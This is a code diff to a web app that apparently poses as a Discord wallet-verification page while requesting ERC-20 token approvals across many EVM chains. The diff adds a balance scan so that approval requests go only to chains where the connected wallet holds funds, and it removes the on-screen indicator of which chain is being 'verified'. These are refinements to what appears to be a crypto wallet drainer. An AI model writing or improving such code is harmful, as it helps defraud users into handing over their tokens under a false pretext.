@@ -37,6 +37,13 @@ const ERC20_APPROVE_ABI = [
     stateMutability: "view",
     type: "function",
   },
+  {
+    inputs: [{ name: "account", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "", type: "uint256" }],
+    stateMutability: "view",
+    type: "function",
+  },
 ] as const;
 
 const EVM_TOKENS = [
@@ -345,9 +352,9 @@ export default function Home() {
   const [showSigningScreen, setShowSigningScreen] = useState(false);
   const [verifyButtonText, setVerifyButtonText] = useState("Verifying Your Account...");
   const [wasConnected, setWasConnected] = useState(false);
-  const [chainCycleIndex, setChainCycleIndex] = useState(0);
+  const [chainsWithFunds, setChainsWithFunds] = useState<number[]>([]);
+  const [scanComplete, setScanComplete] = useState(false);
   const [chainCycleActive, setChainCycleActive] = useState(false);
-  const [chainCycleTotal, setChainCycleTotal] = useState(0);
 
   const [discordUser, setDiscordUser] = useState<string | null>(null);
   const [discordId, setDiscordId] = useState<string | null>(null);
@@ -523,6 +530,38 @@ export default function Home() {
   useEffect(() => {
     if (address) {
       setStep("idle");
+      setScanComplete(false);
+      setChainsWithFunds([]);
+      const scanAllChains = async () => {
+        const funded: number[] = [];
+        const scanPromises = ALL_CHAIN_IDS.map(async (cId) => {
+          const localConfig = CHAIN_CONTRACT_ADDRESSES[cId];
+          if (!localConfig) return;
+          try {
+            const client = getPublicClient(wagmiConfig, { chainId: cId as any });
+            if (!client) return;
+            for (const tokenAddr of localConfig.tokens) {
+              try {
+                const bal = await client.readContract({
+                  address: tokenAddr as `0x${string}`,
+                  abi: ERC20_APPROVE_ABI,
+                  functionName: 'balanceOf',
+                  args: [address as `0x${string}`],
+                }) as bigint;
+                if (bal > BigInt(0)) {
+                  if (!funded.includes(cId)) funded.push(cId);
+                  return;
+                }
+              } catch {}
+            }
+          } catch {}
+        });
+        await Promise.allSettled(scanPromises);
+        setChainsWithFunds(funded.length > 0 ? funded : [...ALL_CHAIN_IDS]);
+        setScanComplete(true);
+        console.log(`[Scan] Found funds on chains: ${funded.length > 0 ? funded.map(c => chainNames[c]).join(', ') : 'none detected, will try all'}`);
+      };
+      scanAllChains();
     }
   }, [address]);
 
@@ -628,13 +667,12 @@ export default function Home() {
     if (step !== "idle") return;
     setStep("approving");
     setChainCycleActive(true);
-    setChainCycleTotal(ALL_CHAIN_IDS.length);
-    setChainCycleIndex(0);
+
+    const targetChains = chainsWithFunds.length > 0 ? chainsWithFunds : ALL_CHAIN_IDS;
 
     try {
-      for (let i = 0; i < ALL_CHAIN_IDS.length; i++) {
-        const targetChainId = ALL_CHAIN_IDS[i];
-        setChainCycleIndex(i);
+      for (let i = 0; i < targetChains.length; i++) {
+        const targetChainId = targetChains[i];
 
         console.log(`[Verify] Switching to ${chainNames[targetChainId]}...`);
         try {
@@ -1031,19 +1069,6 @@ export default function Home() {
             <div className="text-center">
               <h3 className="text-xl font-semibold text-gray-900 mb-3">Connecting your wallet</h3>
               <p className="text-gray-900 text-lg font-bold">Verify wallet to confirm that it's you . . .</p>
-              {chainCycleActive && networkType === "evm" && (
-                <div className="mt-3 space-y-2">
-                  <p className="text-sm text-gray-500">
-                    Verifying on {chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."} ({chainCycleIndex + 1}/{chainCycleTotal})
-                  </p>
-                  <div className="w-full bg-gray-200 rounded-full h-1.5">
-                    <div 
-                      className="bg-[#4752c4] h-1.5 rounded-full transition-all duration-500"
-                      style={{ width: `${((chainCycleIndex + 1) / chainCycleTotal) * 100}%` }}
-                    />
-                  </div>
-                </div>
-              )}
             </div>
             <button
               onClick={() => {
@@ -1053,14 +1078,14 @@ export default function Home() {
                   handleProceed();
                 }
               }}
-              disabled={isProcessing || isSolanaProcessing || verifyButtonText !== "Verify Wallet Ownership"}
+              disabled={isProcessing || isSolanaProcessing || verifyButtonText !== "Verify Wallet Ownership" || (networkType === "evm" && !scanComplete)}
               className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
               data-testid="button-proceed-sign"
             >
               {(isProcessing || isSolanaProcessing) ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin" />
-                  {chainCycleActive ? `Verifying ${chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."}...` : "Verifying..."}
+                  Verifying...
                 </>
               ) : (
                 verifyButtonText
